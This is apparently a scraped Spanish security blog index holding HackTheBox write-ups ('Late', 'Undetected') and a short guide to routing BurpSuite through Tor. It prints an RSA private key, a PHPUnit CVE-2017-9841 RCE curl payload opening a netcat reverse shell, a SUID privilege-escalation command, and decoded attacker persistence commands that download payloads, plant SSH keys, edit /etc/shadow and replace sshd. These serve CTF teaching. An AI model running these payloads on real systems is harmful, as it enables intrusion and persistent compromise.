KEY-----MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrMHiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEObgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB77IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLMfLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgzW0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZuFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwCT9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IHQl49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troiWEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7NgHr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIEuJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQGUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8Fry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMbVh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfrkr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oALK6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==-----END RSA PRIVATE KEY-----❯ ssh -i id_rsa scv_acc@10.10.11.156Escalando privilegiosTransición de archivosDescargamos linpeas y pspyMovemos los archivos a nuestros directorios de trabajo y creamos un servidor por http:❯ mv ~/Downloads/pspy pspy❯ mv ~/Dowloads/linpeas.sh❯ python3 -m http.server 80Y en la máquina víctima:❯ svc_acc@late:~$ wget http://10.10.16.28/pspy❯ svc_acc@late:~$ wget http://10.10.16.28/linpeas.sh❯ svc_acc@late:~$ chmod 700 pspy; chmod 700 linpeas.shAnalizando posible vectorAhora podemos usar linpeas o pspy para ver si hay algo de lo que nos podamos aprovechar para escalar privilegios. Ejecutando linpeas en la máquina víctima, nos aparece este archivo que podemos modificar, además tiene la extensión .sh:╔══════════╣ .sh files in path╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-pathYou own the script: /usr/local/sbin/ssh-alert.shVeamos qué tiene el archivo:svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh #!/bin/bashRECIPIENT=\"root@late.htb\"SUBJECT=\"Email from Server Login: SSH Alert\"BODY=\"\tA SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a`\"if [ ${PAM_TYPE} = \"open_session\" ]; then echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT}fiSi ejecutamos pspy (también en la máquina víctima) vemos que el archivo en el que podemos “escribir”. Constantemente el usuario root lo esta copiando y nos asigna como propietarios del mismo:CMD: UID=0 PID=29874 | /bin/bash /root/scripts/cron.sh CMD: UID=0 PID=29873 | /bin/sh -c /root/scripts/cron.sh CMD: UID=0 PID=29872 | /usr/sbin/CRON -f CMD: UID=0 PID=29877 | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh CMD: UID=0 PID=29879 | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh CMD: UID=0 PID=29885 | /bin/bash /root/scripts/cron.sh CMD: UID=0 PID=29884 | /bin/sh -c /root/scripts/cron.sh CMD: UID=0 PID=29883 | /usr/sbin/CRON -f CMD: UID=0 PID=29890 | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.shAnalizando el script, entendemos que envía un correo con ciertas especifícaciones cuando iniciamos sesión por SSH gracias al control PAM (nos podría sacar a patadas si ven algo inusual en los inicios de sesión…)Ahora ¿Cómo sabemos que el script se está ejecutando? Bueno, podemos revisar algunos archivos de configuración (.bashrc, .profile, /etc) o buscar el texto /usr/local/sbin/ssh-alert.sh de forma recursiva con grep para saber desde dónde se está ejecutando, de la siguiente forma:❯ svc_acc@late:~$ grep -r '/usr/local/sib/ssh-alert.sh' / 2&gt;/dev/nullsession required pam_exec.so /usr/local/sbin/ssh-alert.shPodemos ver que está en el archivo /etc/pam.d/sshd; por lo que, ya podemos darnos a la idea de que se está ejecutando cada vez que iniciamos sesión por SSH.Ahora veamos los permisos de ssh-alert.sh:❯ svc_acc@late:/usr/local/sbin$ ls -latotal 12drwxr-xr-x 2 svc_acc svc_acc 4096 Jul 29 16:20 .drwxr-xr-x 10 root root 4096 Aug 6 2020 ..-rwxr-xr-x 1 svc_acc svc_acc 433 Jul 29 16:20 ssh-alert.sh❯ svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh -----a--------e--- ssh-alert.shAparentemente tenemos permisos de escritura -rwxr-xr-x, sin embargo listando los atributos del archivo, podemos ver que tiene la letra a, esto quiere decir que no podemos modificar nada de lo que tiene un archivo. Aún así, al script se le puede agregar nueva información. Si quisieramos convertirnos en root podríamos hacer lo siguiente:svc_acc@late:/usr/local/sbin$ echo 'chmod u+s /bin/bash' &gt;&gt; /usr/local/sbin/ssh-alert.shEscribimos en el archivo (ssh-alert) que queremos darle permisos SUID al binario /bin/bashSalimos de la sesión y volvemos a iniciar con el mismo usuario:❯ svc_acc@late:/usr/local/sbin$ exitConnection to 10.10.11.156 closed❯ ssh svc_acc@10.10.11.156 -i id_rsa❯ bash-4.4$ /bin/bash -p❯ bash-4.4\\# whoamirootCuando iniciamos sesión, el código es interpretado, asigna el permiso dado a /bin/bashEjecutamos /bin/bash con permisos privilegiados (-p) y somos root :D.¡Happy Hacking!" }, { "title": "WriteUp Undetected HTB", "url": "/posts/WriteUp-Undetected-HTB/", "categories": "HackTheBox, WriteUp, Machines, Linux", "tags": "sshd, reversing, Attacks/Backdoor, strings, Ghidra, PHP Unit, CyberChef", "date": "2022-07-04 00:00:00 -0500", "snippet": "Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc rootMáquina Undetected IP 10.10.11.146 OS Linux Dificultad Media Creador TheCyberGeek Herramientas y recursos empleados Herramientas nmap whatweb JohnTheRipper Recursos CyberChef Fase de enumeraciónComenzamos realizando un escaneo con nmap:# nmap -p- --min-rate --open 5000 -sS -Pn -vvv -n -oG scan1.out 10.10.11.146# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.11.146 ()\tStatus: UpHost: 10.10.11.146 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///Vamos a realizar el siguiente escaneo con nmap para obtener un poquito más de información relevante sobre los puertos econtrados anteriormente:# nmap -p80,22 -sCV -Pn -oN services.out 10.10.11.146Nmap scan report for 10.10.11.146PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)|_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana\\'s Jewelry|_http-server-header: Apache/2.4.41 (Ubuntu)Vemos el titulo de la web Diana’s Jewelry y la versión del servidor apache 2.4.41, también nos dice que está corriendo el servicio en un sitema operativo Ubuntu, esto último lo podremos corroborar cuando estemos dentro del sistema (por si no hay un falso positivo), de resto no hay mucho más; por lo que, procedemos a enumerar la web ya que de momento no contamos con ninguna credencial para acceder por ssh. Ejecutamos la herramienta whatweb en la terminal:❯ whatweb http://10.10.11.146http://10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana\\'s Jewelry]No obtenemos casi nada relevante (se está usando una versión desactualizada de JQuery, podríamos intentar ver si es vulnerable a prototype pollution) de momento sigamos enumerando.Vamos a visualizar la web desde el navegador:Todos los botones que hay, no nos llevan a ninguna parte interesante a excepción de store, el cual es un subdominio store.djewelry.htb, agregamos este subdominio a nuestro archivo /etc/hosts para que al momento de poner el subdominio en la web, el navegador sepa resolver la dirección.Otra vez, ninguno de los botones nos llevan a ningún lado interesante, incluso en un apartado nos dice que la web está inoperativa para hacer pedidos.Procedemos a fuzzear directorios lanzando el script http-enum de nmap que tiene un diccionario con alrededor de 1000 rutas comunes de sitios web. En la primera web no vemos nada interesante de lo que nos podamos aprovechar (el dominio es djewelry.htb). Hacemos lo mismo para la segunda web con el subdomino store y nos encontramos los siguientes directorios:❯ nmap -p80 --script http-enum store.djewelry.htbNmap scan report for store.djewelry.htb (10.10.11.146)PORT STATE SERVICE80/tcp open http| http-enum: | /login.php: Possible admin folder| /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'| /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'| /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'|_ /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'Ya hay dos cosas que llaman bastante la atención: de primeras, la web tiene capacidad de directory listing y de segundo tenemos una carpeta llamada vendor donde se encuentran librerias de PHP (según practicas que se usan normalmente en el desarrollo).Comprobamos que tenemos directory listing y vemos lo que hay en la carpeta vendor:Explotando la vulnerabilidad de PHP UnitSi hacemos un poco de investigación sobre lo que podemos hacer con lo que tenemos, nos encontramos con la vulnerabilidad CVE-2017-9841. Comprobamos que la ruta para explotar la vulnerabilidad existe. Y sí, tenemos la ruta. El código PHP se interpreta y no nos muestra nada en la web, esto pinta muy bien para nosotros.Por lo que ejecutando lo siguiente en la terminal:❯ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d \"&lt;?php system('ifconfig')?&gt;\"Nos damos cuenta de que tenemos RCE (ejecución remota de comados en la máquina victima).Vamos a entablarnos una revershell a nuestra interfaz tun0 por el puerto 443 con netcat:❯ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d \"&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 10.10.16.2 443 &gt;/tmp/f')?&gt;\"…y poniéndonos en escucha con netcat en otra ventana:❯ nc -nvlp 443Ganamos acceso como el usuario www-dataAhora procedemos a hacer el tratamiento de la tty para tener una shell interactiva.Escalando prilivegios al usuario stevenHaciendo reconocimiento básico sobre el sistema con este usuario, no encontramos nada de lo que nos podamos aprovechar; sin embargo, hay un archivo que llama bastante la atención en la ruta /var/backups/info (es un binario).Pasamos el archivo (una copia) a nuestra máquina para trabajar más comodo, escribimos lo siguiente en la máquina victima:❯ nc -Nv 10.10.16.9 4343 &lt; info…y en nuestra máquina escribimos:❯ nc -nvlp 4343 &gt; infoEjecutamos el comando strings sobre el binario:❯ strings info…encontramos el siguiente texto dentro de todas las cadenas imprimibles: 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743bParece hexadecimal. Lo copiamos y lo metemos en un archivo para guardar la evidencia. Ahora podemos tratarlo con el siguiente comando:❯ cat info_hex | xxd -p -rLo que nos muestra lo siguiente:wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" &gt;&gt; /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" &amp;&amp; $3 &gt;= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" &amp;&amp; $3 &gt;= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" &gt; users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt;Podemos observar lo que parece un hash de una contraseña, lo guardamos en un archivo. Yo le pondré hash. Ahora podemos crackearlo con John the Ripper:❯ john -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusihatehackers (?)Use the \"--show\" option to display all of the cracked passwords reliablySession completedObtenemos en texto claro su equivalencia (linea 7: ìhatehackers) ¿De qué usuario? En el /etc/passwd podimos ver que hay dos usuarios con una shell, los cuales son “steven y steven1” (además de “root” y “www-data”). Probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario steven1.❯ su steven1Password: ihatehackersIncluso si probamos la conexión por ssh, podemos acceder a ese usuario.Escalando privilegios al usuario rootProcedemos a realizar enumeración con este usuario. Revisando algunos archivos nos encontramos con un email en la siguiente ruta /var/mail/steven.steven@production:/var/mail$ cat stevenFrom root@production Sun, 25 Jul 2021 10:31:12 GMTReturn-Path: &lt;root@production&gt;Received: from production (localhost [127.0.0.1])\tby production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847\tfor &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMTReceived: (from root@localhost)\tby production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;\tSun, 25 Jul 2021 10:31:12 GMTDate: Sun, 25 Jul 2021 10:31:12 GMTMessage-Id: &lt;202107251031.80FAcdZ171847@production&gt;To: steven@productionFrom: root@productionSubject: InvestigationsHi Steven.We recently updated the system but are still experiencing some strange behaviour with the Apache service.We have temporarily moved the web store and database to another server whilst investigations are underway.If for any reason you need access to the database or web application code, get in touch with Mark and hewill generate a temporary password for you to authenticate to the temporary server.Thanks,sysadminEl sysadmin le menciona a steven un comportamiento raro con el servidor apache a pesar de haber actualizado el sistema. Vayamos a revisar.En la ruta /lib/apache2/modules vemos una cantidad de archivos aparentemente normales; sin embargo, el comportamiento extraño puede darnos la idea de que alguien más ha comprometido el sistema, y por lo tanto, ha manipulado archivos para mantener su persistencia. Así que revisemos bien los archivos que hay:Vemos que un archivo ha sido manipulado recientemente:-rw-r--r-- 1 root root 34800 May 17 2021 mod_reader.soNos traemos el archivo a nuestra máquina para revisarlo como hicimos con el último:❯ strings mod_reader.soHay una cadena en base 64. Procedemos a decodificarla y la guardamos en un archivo como evidencia:echo \"d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk\" | base64 -d &gt; mod_reader_hex.txtVemos lo siguiente:❯ cat mod_reader_hex.txtwget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshdEsto es un poco raro ya que hay un archivo de apache (mod_reader.so) que está haciendo algo con el demonio de ssh, están pasando cosas por aquí.Puede que el demonio de ssh haya sido manipulado, por lo que vamos a traer el binario de la máquina victima a la nuestra para analizarlo.Haciendo un strings al binario filtrando por la palabra “backdoor”, vemos lo siguiente:❯ strings sshd | grep \"backdoor\" | sort -ubackdoorbackdoor_activebackdoor.hPodemos intuir que efectivamente se ha manipulado el binario.Abrimos nuestro analizador de confinza Ghidra para descompilar el binario:Comenzamos a buscar funciones que pudieron ser modificadas, nos encontramos con la función auth_passwd que tiene lo siguiente:En la linea 29 puede que no esté interpretando bien el valor, así que lo cambiamos dando clic izquierdo sobre él y haciendo clic en lo que nos interesa. En este caso a char.Procedamos a analizar lo que está sucediendo allí. Prestemos atención a la variable “backdoor” la cual tiene un espacio total de 31 caracteres./* WARNING: Could not reconcile some variable overlaps */int auth_password(ssh *ssh,char *password){ Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; ulong uVar6; byte bVar7; int iVar8; long in_FS_OFFSET;\t//se asigna 31 caracteres de longitud char backdoor [31]; byte abStack57 [9]; long lStack48; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-&gt;authctxt; lStack48 = *(long *)(in_FS_OFFSET + 0x28);\t//a las siguientes variables se les asignan valores en hexadecimal backdoor._28_2_ \t= 0xa9f4; ppVar1 \t\t\t = ctxt-&gt;pw; iVar8 \t\t\t = ctxt-&gt;valid; backdoor._24_4_ \t= 0xbcf0b5e3; backdoor._16_8_ \t= 0xb2d6f4a0fda0b3d6; backdoor[30] \t\t = 0xa5; backdoor._0_4_ \t = 0xf0e7abd6; backdoor._4_4_ \t = 0xa4b3a3f3; backdoor._8_4_ \t = 0xf7bbfdc8; backdoor._12_4_ \t= 0xfdb3d6e7; pbVar4 \t\t\t = (byte *)backdoor; while( true ) { pbVar5 = pbVar4 + 1; *pbVar4 = bVar7 ^ 0x96; //se está haciendo un XOR con la key 0x96 a la password ingresada if (pbVar5 == abStack57) break; bVar7 = *pbVar5; pbVar4 = pbVar5; } iVar2 = strcmp(0xa4b3a3f3f0e7abd6,password); //se compara el input que se pasa al conectarse por \t// ssh (la contraseña) uVar3 = 1; if (iVar2 != 0) { //si la comparación y el input son iguales entra a este flujo uVar6 = strlen(password); uVar3 = 0; if (uVar6 &lt; 0x401) { if ((ppVar1-&gt;pw_uid == 0) &amp;&amp; (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != '\\0') || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-&gt;force_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh,password); if (ctxt-&gt;force_pwchange != 0) { auth_restrict_session(ssh); } uVar3 = (uint)(iVar2 != 0 &amp;&amp; iVar8 != 0); } } } if (lStack48 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail();}Bueno, vamos a intentar sacar conclusiones sobre lo visto. Parece que hay una palabra clave deconstruida en las variables “backdoor” y en el bucle while como lo dejé comentado. Se está haciendo un XOR, así que vamos a construir esa palabra clave tal que así:backdoor[30] \t= 0xa5;backdoor._28_2_\t= 0xa9f4;backdoor._24_4_ = 0xbcf0b5e3;backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;backdoor._12_4_ = 0xfdb3d6e7;backdoor._8_4_ \t= 0xf7bbfdc8;backdoor._4_4_ \t= 0xa4b3a3f3;backdoor._0_4_ \t= 0xf0e7abd6;Ahora vamos a jugar con CyberChef: Por último nos intentamos conectar como root a la máquina victima con la contraseña obtenida:❯ sshpass -p '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3' ssh root@10.10.11.146Y efecticamente, esa era la comparación que se estaba haciendo en el demonio de ssh modificado.¡Happy Hacking!" }, { "title": "Socks y BurpSuite", "url": "/posts/burpsuite-socks/", "categories": "BurpSuite, Socks, tor", "tags": "Anonimato, systemctl, IP, foxyproxy, nmap", "date": "2022-06-05 00:00:00 -0500", "snippet": "Índice Herramientas que debemos instalar o tener Configurando BurpSuite Habilitar el servicio tor Hasta el próximo postEl día de hoy y como primer artículo, haremos algo sencillo: aprenderemos a interceptar y enviar peticiones de una forma un tanto diferente a lo habitual ¿Por qué diferente? Pues bien, vamos a usar TOR como proxy de BurpSuite. Sí, será un proxy que interceptará datos provenientes de otro proxy, se estarán pasando los paquetitos como una cadena ¿A poco no suena fascinante? Esto lo haremos con la intención de anonimizar peticiones que enviaremos y recibiremos al hacer pruebas desde el favorito de muchos (por no decir de todos) ‘BurpSuite’. No seré de aquellos que te digan qué es un proxy, una petición o tor (por lo menos no en un artículo dirigido a un tema en específico como este) para ello tienes diverso material en internet, aunque si quieres que lo explique en un artículo, házmelo saber y sin rechistar lo haré lo más ameno y pronto posible.Pero bien, seguro que has venido para configurar esto y ser un poco más sigiloso o anónimo (lo que muchos quisiéramos) antes que leer algo denso, así que vayamos al asunto:Herramientas que debemos instalar o tener: TOR BurpSuite Community o ProfessionalConfigurando BurpSuiteCuando tengamos las herramientas instaladas procedemos a abrir Burp Suite. Una vez abierto, nos dirigimos a la pestaña User options. Después damos click en Connections. Hacemos scroll hacía abajo, hasta llegar a las últimas opciones:Podemos ver el apartado SOCKS Proxy. Procedemos a habilitar las opciones: Use SOCKS proxy y Do DNS lookups over SOCKS proxy, después digitamos el host y el puerto por el que estará el proxy. Tengamos en cuenta que el puerto de servicio por default de TOR estará activo en 9050:Una vez hecho lo anterior, para ver que el proxy en Burp Suite fue configurado, damos clic en la pestaña Dashboard para ver los logs. En Message aparace un log (en mi caso 1, porque ya te digo que eliminé los demás logs). Si te aparece el mensaje que te muestro abajo, ya quedó configurado Burp Suite para recibir y enviar las peticiones con el proxy tor:Habilitar el servicio torPara habilitar el servicio tor, escribimos los siguientes comandos en la terminal:sudo systemctl start torEn mi caso, salió una ventana para escribir la contraseña de superusuario.Podemos verificar que tor fue habilitado usando nmap, como muestro a continuación. Aparece el puerto 9050 abierto. Además del puerto por el que escucha Burp Suite, 8080:También podemos verificarlo con los siguientes comandos:systemctl status tortopnetstat | grep --color \"tor\"ps aux | grep --color \"tor\"Si aparece filtrado, quiere decir que el servicio está listo. Ahora solo nos queda enviar una petición con Burp Suite (nuestro proxy de confianza) pero antes debemos interceptarla desde el navegador:Para ello he abierto firefox, me he dirigido a la siguiente url https://www.cual-es-mi-ip.net/. Al entrar en la página, se muestra mi dirección IP pública (por razones obvias no lo mostraré, ni censurado :P). Una vez estando en la página, interceptamos todas las solicitudes que hace el navegador a través de Burp Suite. Gracias a foxyproxy (un addon de firefox) que nos ayuda a dirigir el flujo de peticiones a Burp Suite (os digo que yo ya lo tengo configurado. Es algo que puedes ver en otro post, por lo que no lo explicaré aquí). Algo que se me olvidó decir es que debemos tener activada la opción de proxy en Burp Suite para recibir el tráfico.Una vez Burp Suite esté preparado para recibir peticiones y foxyproxy esté activado para dirigir el flujo, recargamos la página.Vamos a ver la solicitud en Busp Suite, tenemos la solicitud a espera de que hagamos algo con ella. Ahora solamente damos clic a la opción forward varias veces.Cuando deje de aparecer información de las solicitudes, nos dirigimos al navegador a ver lo que ha sucedido:Vemos que la IP ha cambiado, esto quiere decir que el tráfico que hemos enviado de BurpSuite al navegador ha pasado antes por el proxy TOR ¡Fantástico!Hasta el próximo postEspero que os sirva. Aunque es sencillo, me parece algo interesante para compartir.Solamente soy un entusiasta de ciberseguridad, si me he equivocado en algo o hay algún aporte házmelo saber, así aprendemos todos ;)¡Happy hacking!" } ]
